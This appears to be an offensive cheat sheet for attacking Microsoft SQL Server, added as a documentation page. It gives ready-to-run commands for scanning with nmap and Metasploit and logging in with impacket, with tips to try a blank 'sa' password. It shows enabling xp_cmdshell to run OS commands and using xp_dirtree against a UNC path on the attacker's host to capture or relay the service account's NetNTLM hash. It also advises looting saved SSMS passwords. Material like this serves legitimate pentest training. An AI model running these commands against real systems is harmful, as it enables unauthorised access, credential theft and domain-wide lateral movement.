@@ -1,0 +1,144 @@
+---
+title: "MSSQL / Microsoft SQL Server Cheat Sheet"
+---
+
+## Overview
+
+Microsoft SQL Server is Microsoft's closed-source relational database, running almost always on **Windows** and listening on **TCP 1433**. Databases are high-value targets for two reasons: they hold the **crown-jewel data** (users, password hashes, business records), and a privileged DB login can frequently **execute operating-system commands** — turning "I can query a database" into "I have a shell on the server." On top of that, MSSQL integrates tightly with Windows/Active Directory, so a database foothold often becomes **lateral movement** across a domain.
+
+<Info>
+**Why MSSQL specifically is dangerous**
+
+It supports **Windows Authentication** — meaning a compromised AD/Windows account can log straight into the database with no separate password. And the infamous **`xp_cmdshell`** stored procedure lets a sysadmin-level login run Windows commands directly. Together these make MSSQL a classic pivot from "DB access" to "domain compromise."
+</Info>
+
+---
+
+## How authentication works (and why it matters)
+
+MSSQL accepts two login modes:
+
+- **SQL Authentication** — a username/password stored in SQL Server itself (e.g. the built-in `sa` system-admin account).
+- **Windows Authentication** — the database trusts Windows/AD identities. Log in as a Windows user with no DB-specific password.
+
+<Tip>
+**Attack implications**
+
+- The **`sa`** account is the default god-mode login; admins often leave it enabled with a weak/blank password — try it first.
+- If you've compromised *any* Windows account, test **`-windows-auth`** against MSSQL — the same cred may grant DB access and, via `xp_cmdshell`, code execution as the SQL service account.
+</Tip>
+
+---
+
+## Default system databases
+
+Every instance ships with these; recognising them helps you spot the *custom* (interesting) databases:
+
+| Database | Description |
+|---|---|
+| `master` | Core system info for the whole instance |
+| `model` | Template for newly created databases |
+| `msdb` | SQL Server Agent jobs/alerts scheduling |
+| `tempdb` | Temporary objects (wiped on restart) |
+| `resource` | Read-only system objects |
+
+The data *you* want is in the non-default databases — `SELECT name FROM sys.databases;` and ignore the five above.
+
+---
+
+## Footprinting & scanning
+
+<Info>
+**What to learn before connecting**
+
+Version (→ known CVEs), instance/hostname, whether `xp_cmdshell` is available, and whether the `sa` account has a blank password. UDP 1434 (the SQL Browser) answers instance/port queries even before you authenticate.
+</Info>
+
+```bash
+# Nmap script sweep (version, blank sa pw, xp_cmdshell, config, NTLM info)
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-xp-cmdshell,ms-sql-config -sV -p1433 <IP>
+
+# Metasploit ping sweep (UDP 1434 → instance/version/port)
+msfconsole -q
+use auxiliary/scanner/mssql/mssql_ping
+set RHOSTS <IP>
+run
+```
+
+---
+
+## Connecting & interacting (Impacket)
+
+```bash
+# SQL Authentication
+impacket-mssqlclient <user>:<password>@<IP>
+
+# Windows Authentication (local SAM or AD account)
+impacket-mssqlclient <DOMAIN_or_HOST>/<user>:<password>@<IP> -windows-auth
+```
+
+Useful T-SQL at the `SQL>` prompt:
+
+| Command | Description |
+|---|---|
+| `SELECT name FROM sys.databases;` | List databases (look past the 5 defaults) |
+| `USE <db>;` | Switch database |
+| `SELECT * FROM <table>;` | Read a table |
+| `help` | Impacket's built-in pentest helpers (e.g. `enable_xp_cmdshell`) |
+
+---
+
+## From DB access to OS command execution
+
+<Warning>
+**`xp_cmdshell` — the money move**
+
+With a sysadmin-level login you can enable and use `xp_cmdshell` to run Windows commands as the SQL service account. This is the standard MSSQL → RCE path.
+</Warning>
+
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+```
+
+(Impacket exposes shortcuts: `enable_xp_cmdshell` then `xp_cmdshell whoami`.)
+
+### When you *don't* have sysadmin: steal the service account's hash with `xp_dirtree`
+
+`xp_cmdshell` needs a sysadmin login. But even a **low-privileged** SQL login can usually call `xp_dirtree` (and `xp_subdirs` / `xp_fileexist`), which tell SQL Server to go list the contents of a path. The trick: point it at a **UNC path on your attacker box** (`\\<your-IP>\share`). To reach that path, the **SQL service account** authenticates to you over SMB — and in doing so hands you its **NetNTLM hash**.
+
+The reason this works is that Windows automatically authenticates when accessing a remote share, and `xp_dirtree` makes the *server* do the accessing as its own service identity. You've coerced a privileged account into leaking its credentials to you without ever having admin on the database.
+
+```bash
+# 1. On your box, listen for the inbound authentication
+sudo responder -I tun0                 # capture the NetNTLM hash to crack offline
+# (or) sudo impacket-ntlmrelayx -t <other-host> -smb2support   # relay it instead of cracking
+```
+
+```sql
+-- 2. From the SQL prompt, force SQL Server to authenticate to you
+EXEC xp_dirtree '\\<your-IP>\share', 1, 1;
+```
+
+You then either **crack** the captured NetNTLM hash offline (`hashcat -m 5600`) or **relay** it with `ntlmrelayx` to authenticate to another host the service account can access — no cracking required. This is the standard escape hatch when the login isn't sysadmin.
+
+---
+
+## Configuration & security risks
+
+- **Weak/enabled `sa`** — default sysadmin, often left with a weak or blank password.
+- **Windows Auth abuse** — a compromised domain account logs straight in → lateral movement.
+- **`xp_cmdshell`** — DB-to-OS command execution for sysadmin logins.
+- **SSMS saved passwords** — admin workstations often store auto-login SQL profiles; loot them after compromising a box.
+- **Unencrypted / self-signed TLS** — sniffable or MITM-able connections.
+
+---
+
+## Key Takeaways
+
+- MSSQL (TCP **1433**) is a high-value target: it stores sensitive data **and** can give OS command execution.
+- Two auth modes: **SQL Auth** (try `sa` with weak/blank pw) and **Windows Auth** (`-windows-auth` with any compromised Windows/AD cred).
+- `impacket-mssqlclient` is the Linux client; footprint first with Nmap `ms-sql-*` scripts / `mssql_ping`.
+- The headline attack is **`xp_cmdshell`** → run Windows commands as the SQL service account → foothold/lateral movement.
+- Always loot **SSMS saved credentials** on compromised admin workstations.
